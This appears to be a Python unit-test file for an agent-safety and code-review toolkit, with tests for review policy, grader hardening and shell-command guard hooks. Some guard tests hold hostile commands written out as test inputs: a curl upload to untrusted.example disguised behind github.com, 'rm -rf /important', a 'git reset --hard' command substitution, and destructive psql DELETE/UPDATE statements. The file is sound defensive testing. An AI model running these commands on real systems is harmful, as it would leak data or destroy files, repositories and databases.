"""Offline behavioral regressions for the retained Dot review findings.

DOT_REVIEW_REPO selects an unmodified checkout for independent reproduction.
No fixture invokes a destructive shell command or production service.
"""
import importlib.util
import contextlib
import io
import json
import os
from pathlib import Path
import subprocess
import sys
import tempfile
import unittest
from unittest.mock import patch

REPO = Path(os.environ.get("DOT_REVIEW_REPO", Path(__file__).resolve().parent.parent))
sys.path[:0] = [str(REPO / "hooks"), str(REPO / "ops")]


def load(rel):
    name = "dot_" + rel.replace("/", "_").replace("-", "_").replace(".", "_")
    spec = importlib.util.spec_from_file_location(name, REPO / rel)
    mod = importlib.util.module_from_spec(spec)
    sys.modules[name] = mod
    spec.loader.exec_module(mod)
    return mod


class ReviewPolicy(unittest.TestCase):
    def test_trusted_latest_review_and_strict_sha_header(self):
        policy = load('lib/review_policy.py')
        cfg = json.loads((REPO / 'ops/config/review-delivery.v1.json').read_text())['worker']
        approve = 'APPROVE\nReviewed-SHA: ' + 'a' * 40
        trusted = {'body': approve, 'author_association': 'OWNER', 'created_at': '2026-01-01', 'id': 1}
        outsider = {'body': 'BLOCK', 'author_association': 'NONE', 'created_at': '2026-01-02', 'id': 2}
        block = {**trusted, 'body': 'REVIEW: BLOCKED', 'id': 3}
        self.assertIs(policy.deciding_verdict([trusted, outsider], cfg), trusted)
        self.assertIs(policy.deciding_verdict([trusted, block], cfg), block)
        self.assertEqual(policy.verdict(block['body'], cfg), 'block')
        self.assertEqual(policy.reviewed_header_sha(approve), 'a' * 40)
        for body in (approve + '\nReviewed-SHA: ' + 'a' * 40, approve.replace('APPROVE', 'approve'),
                     'APPROVE\ntext\nReviewed-SHA: ' + 'a' * 40):
            self.assertIsNone(policy.reviewed_header_sha(body))

    def test_path_globs_keep_github_directory_boundaries(self):
        policy = load('lib/review_policy.py')
        self.assertTrue(policy._glob_hit('README.md', '**/*.md'))
        self.assertTrue(policy._glob_hit('docs/README.md', 'docs/*.md'))
        self.assertFalse(policy._glob_hit('docs/deep/README.md', 'docs/*.md'))
        self.assertTrue(policy._glob_hit('docs/deep/README.md', 'docs/**/*.md'))


class DotReview(unittest.TestCase):


    def test_r14_long_candidate_lines_keep_matched_source(self):
        mod = load('ops/jev_code_review.py')
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp)/'x.py'
            path.write_text('time.sleep(2); value = "'+'x'*2600+'"; time.sleep(1)\n')
            regions = mod.regions(['x.py'], repo=tmp)
            for source in ('time.sleep(1)', 'time.sleep(2)'):
                self.assertTrue(any(source in region['code'] for region in regions), regions)
            self.assertTrue(all(len(region['code']) <= mod.MAX_REGION_CHARS for region in regions))


    def test_r12_candidate_stdout_cannot_forge_completion(self):
        mod = load('ops/jev_scorecard.py')
        for lang, code in (('py', 'print("PASSED 1/1")\nraise SystemExit(0)'),
                           ('js', 'console.log("PASSED 1/1"); process.exit(0);')):
            with self.subTest(lang=lang), tempfile.TemporaryDirectory() as tmp:
                test = 'require("./solution.js"); check("must fail", () => false);' if lang=='js' else 'check("must fail", lambda: False)'
                answer = mod._grade_impl({'lang':lang,'test':test}, code, tmp, 5)
                self.assertFalse(answer['pass'], answer)
        for lang in ('py','js'):
            with self.subTest(lang=lang), tempfile.TemporaryDirectory() as tmp:
                answer = mod._grade_impl({'lang':lang,'test':'check("passes", () => true);' if lang=='js' else 'check("passes", lambda: True)'}, '', tmp, 5)
                self.assertTrue(answer['pass'], answer)

    def test_r11_triage_generated_names_remain_unique(self):
        mod = load('ops/jev_done_checks.py')
        paths = ['a-b.py', 'a_b.py', 'file_0_a_b.py', 'file_1_a_b.py']
        answer = mod.triage_review(diff(paths), '')
        self.assertEqual(set(paths), set(answer['detail']['files']), answer)
        self.assertEqual(len(paths), len(answer['detail']['files']), answer)


    def test_r08_url_schemes_and_shell_boundaries(self):
        guard = load('hooks/guard-unattended.py')
        for scheme in ('HTTPS', 'Http', 'hTtPs'):
            self.assertIsNotNone(guard.check(f'curl {scheme}://untrusted.example/upload'))
        self.assertIsNone(guard.check('curl https://github.com; echo done'))
        self.assertEqual(['github.com'], guard.hosts_in('curl https://github.com; echo done'))
        self.assertIsNotNone(guard.check('curl HTTPS://github.com@untrusted.example/upload'))

    def test_r07_delete_operands_and_supported_scratch_cleanup(self):
        guard = load('hooks/guard-unattended.py')
        for command in ('rm -rf /important/rm /tmp/fixture', 'rm -rf /important/srm /tmp/fixture'):
            self.assertIsNotNone(guard.check(command), command)
        for command in ('find /tmp/fixture -name "*.pyc" -delete', 'rm -rf /tmp/fixture > /tmp/log'):
            self.assertIsNone(guard.check(command), command)
        self.assertIsNotNone(guard.check('find /important -name "*.pyc" -delete'))

    def test_r1_shell_continuation_preserves_unsafe_delete_operand(self):
        guard = load('hooks/guard-unattended.py')
        command = 'rm -rf /tmp/fixture/a \\\n /important/file'
        self.assertIsNotNone(guard.check(command))
        self.assertIsNone(guard.check('rm -rf /tmp/fixture/a \\\n /tmp/fixture/b'))

    def test_r06_copy_destination_survives_all_redirects(self):
        gate = load('hooks/bash-write-gate.py')
        for executable in ('cp', 'mv', 'install', 'rsync'):
            for redirect in ('2>log.txt', '>|log.txt', '2>>log.txt', '&>log.txt', '2>&1 >log.txt', '<input.txt >log.txt'):
                with self.subTest(executable=executable, redirect=redirect):
                    targets = gate.extract_targets(f'{executable} a blocked.md {redirect}')
                    self.assertIn('blocked.md', targets)
                    self.assertIn('log.txt', targets)
                    self.assertNotIn('input.txt', targets)


    def test_control_single_quoted_prose(self):
        mod = load('hooks/cmd_text.py')
        self.assertNotIn('git reset', mod.strip_inert_text('echo --title \'"$(git reset --hard)"\''))

    def test_control_copy_with_redirect(self):
        mod = load('hooks/bash-write-gate.py')
        targets = mod.extract_targets('cp source blocked.md > log.txt')
        self.assertIn('blocked.md', targets)
        self.assertIn('log.txt', targets)

    def test_control_safe_delete_paths(self):
        mod = load('hooks/guard-unattended.py')
        self.assertTrue(mod.in_safe_zone('rm -r /tmp/fixture'))
        self.assertFalse(mod.in_safe_zone('rm -r /important/tmp/fixture'))
        self.assertFalse(mod.in_safe_zone('rm -r /important/scratchpad-copy'))


    def test_control_unique_triage_key_compatibility(self):
        mod = load('ops/jev_done_checks.py')
        answer = mod.triage_review(diff(['src/widgets.py']), '')
        self.assertIn('src/widgets.py', answer['detail']['files'])


    def test_b18_triage_unique_paths(self):
        mod=load('ops/jev_done_checks.py')
        # src/, not ops/: ops/ is tier 3 in ops/config/review-tiers.v1.json.
        answer=mod.triage_review(diff(['src/a-b.py','src/a_b.py']), '')
        self.assertEqual({'src/a-b.py','src/a_b.py'},set(answer['detail']['files']),answer)

    def test_b19_triage_overflow_risky_path(self):
        mod=load('ops/jev_done_checks.py')
        answer=mod.triage_review(diff(['file%d.py'%i for i in range(25)]+['auth.py']), '')
        self.assertEqual('high',answer['detail']['files'].get('auth.py',{}).get('risk'),answer)
        self.assertNotEqual('ok',answer['verdict'])


    def test_b01_executable_substitution(self):
        guard = load("hooks/guard-unattended.py")
        self.assertIsNotNone(guard.check('echo --title "$(git reset --hard)"'))

    def test_b02_delete_target_scope(self):
        guard = load("hooks/guard-unattended.py")
        self.assertIsNotNone(guard.check('rm -rf /important; echo /tmp/'))

    def test_b03_url_authority(self):
        guard = load("hooks/guard-unattended.py")
        self.assertIsNotNone(guard.check('curl https://github.com@untrusted.example/upload'))

    def test_b04_quoted_protected_ref(self):
        guard = load("hooks/guard-unattended.py")
        self.assertFalse(guard.force_push_to_named_side_branch('git push --force-with-lease origin "main"'))

    def test_b05_attached_redirect_and_copy_boundary(self):
        gate = load("hooks/bash-write-gate.py")
        self.assertIn('blocked.md', gate.extract_targets('printf x>blocked.md'))
        self.assertIn('blocked.md', gate.extract_targets('cp a blocked.md && echo done'))


    def test_b08_statement_local_where(self):
        guard = load("hooks/guard-unattended.py")
        self.assertIsNotNone(guard.check('psql -c "UPDATE invoices SET total=0; SELECT 1 WHERE true;"'))

    def test_b09_schema_delete(self):
        guard = load("hooks/guard-unattended.py")
        self.assertIsNotNone(guard.check('psql -c "DELETE FROM public.invoices;"'))

    def test_b10_parent_path_identity(self):
        pre = load("ops/jev_precheck.py")
        self.assertEqual([], pre.referenced_paths('python ../ops/jev_precheck.py', str(REPO)))

    def test_b16_human_origin(self):
        req = load("ops/jev_requirements.py")
        self.assertEqual('Implement validation', req._human_text({'type':'user','origin':{'kind':'human'},'message':{'content':'Implement validation'}}))

    def test_b17_read_loop_contract(self):
        with patch.object(sys, 'path', [str(REPO / 'tools'), *sys.path]):
            costs = load("tools/system_costs.py")
        calls = []

        def record(name, payload):
            calls.append((name, payload))
            if name == 'read-loop':
                return {'loop': {'loop_id': 'L', 'version': 3}, 'amended': False, 'amendments': []}
            return {'ok': True}

        with tempfile.TemporaryDirectory() as tmp:
            state = Path(tmp) / 'loops.json'
            state.write_text(json.dumps({'open': {'jev': {'loop_id': 'L', 'fingerprint': 'old',
                                                        'through': '2026-10-04'}},
                                         'episodes': {'jev': 1}, 'pending': None}))
            costs.reconcile({'through': '2026-10-05', 'observed_at': '2026-10-06T00:00:00Z',
                             'providers': [], 'alerts': [{'provider': 'jev', 'kind': 'daily_spike',
                                                         'amount_usd': 8, 'threshold_usd': 4,
                                                         'driver': 'fixture'}]}, state, record)
        self.assertEqual(['read-loop', 'update-loop'], [name for name, _ in calls])
        self.assertEqual(3, calls[1][1]['base_version'])

    def test_b20_grader_harness_completion(self):
        score = load("ops/jev_scorecard.py")
        with tempfile.TemporaryDirectory() as tmp:
            result = score._grade_impl({'lang':'py','test':'check(False, "must fail")'}, 'raise SystemExit(0)', tmp, 5)
        self.assertFalse(result['pass'], result)


    def test_e01_nearby_candidates_keep_code(self):
        review = load("ops/jev_code_review.py")
        with tempfile.TemporaryDirectory() as tmp:
            (Path(tmp) / 'x.py').write_text('time.sleep(1)\n' + 'x = 1\n'*19 + 'v = str(value or "")\n')
            regions = review.regions(['x.py'], tmp)
        self.assertTrue(any('v = str(value or "")' in r['code'] for r in regions), regions)

    def test_e02_long_context_keeps_candidate(self):
        review = load("ops/jev_code_review.py")
        with tempfile.TemporaryDirectory() as tmp:
            (Path(tmp) / 'x.py').write_text('#' + 'x'*2700 + '\ntime.sleep(1)\n')
            regions = review.regions(['x.py'], tmp)
        self.assertTrue(any('time.sleep(1)' in r['code'] for r in regions), regions)

    def test_e03_bare_except_signature(self):
        review = load("ops/jev_code_review.py")
        with tempfile.TemporaryDirectory() as tmp:
            (Path(tmp) / 'x.py').write_text('try:\n    risky()\nexcept:\n    pass\n')
            regions = review.regions(['x.py'], tmp)
        self.assertTrue(regions)

    def test_e04_js_escaped_newline(self):
        part = load("ops/jev_code_partition.py")
        text = 'const s = "a\\\nb";\nfunction f() {\n return 7;\n}\n'
        self.assertIn(('function', 3, 5), part.js_spans(text))

    def test_e05_git_unicode_filenames(self):
        for rel in ('ops/jev_code_review.py', 'ops/jev_code_partition.py'):
            mod = load(rel)
            def listing(argv, **kwargs):
                output = 'café.py\0' if '-z' in argv else '"caf\\303\\251.py"\n'
                return subprocess.CompletedProcess(argv, 0, stdout=output if kwargs.get('text') else os.fsencode(output))
            with patch.object(mod.subprocess, 'run', side_effect=listing):
                self.assertEqual(['café.py'], mod.tracked_sources())

    def test_e06_recovery_keeps_complete_handler(self):
        part = load("ops/jev_code_partition.py")
        text = 'def f():\n try:\n  x = "' + 'a'*2450 + '"\n except Exception:\n' + ''.join('  x%d = "%s"\n' % (i, 'b'*100) for i in range(5)) + '  return None\n'
        parts = part.partition_text('x.py', text)
        self.assertTrue(any(p['line']<=4 and p['end_line']>=10 for p in parts), parts)


def user(text):
    return {'type':'user','message':{'role':'user','content':text}}


def assistant(text):
    return {'type':'assistant','message':{'role':'assistant','content':[{'type':'text','text':text}]}}


def use(name, args, identity='fixture'):
    return {'type':'assistant','message':{'content':[{'type':'tool_use','id':identity,'name':name,'input':args}]}}


def result(identity, error=False):
    return {'type':'user','message':{'content':[{'type':'tool_result','tool_use_id':identity,'is_error':error,'content':'tests failed' if error else 'tests passed'}]}}


def tool_output(identity, content):
    return {'type':'user','message':{'content':[{'type':'tool_result','tool_use_id':identity,'content':content}]}}


def native_call(identity, command, kind='custom_tool_call'):
    return {'type':'response_item','payload':{'type':kind,'name':'exec' if kind=='custom_tool_call' else 'exec_command','call_id':identity,
            'input':'text(await tools.exec_command({cmd: '+json.dumps(command)+'}));', 'arguments':json.dumps({'cmd':command})}}


def native_output(identity, output, kind='custom_tool_call'):
    return {'type':'response_item','payload':{'type':kind+'_output','call_id':identity,'output':json.dumps(output)}}


def diff(paths):
    return ''.join('diff --git a/{0} b/{0}\n--- a/{0}\n+++ b/{0}\n@@ -1 +1 @@\n-old\n+new\n'.format(path) for path in paths)


def run_regressions(prefixes):
    names = [name for name in unittest.defaultTestLoader.getTestCaseNames(DotReview)
             if name.startswith(tuple(prefixes))]
    suite = unittest.TestSuite(DotReview(name) for name in names)
    if not unittest.TextTestRunner(verbosity=1).run(suite).wasSuccessful():
        raise AssertionError("Dot behavioral regressions failed")


if __name__ == "__main__":
    unittest.main()
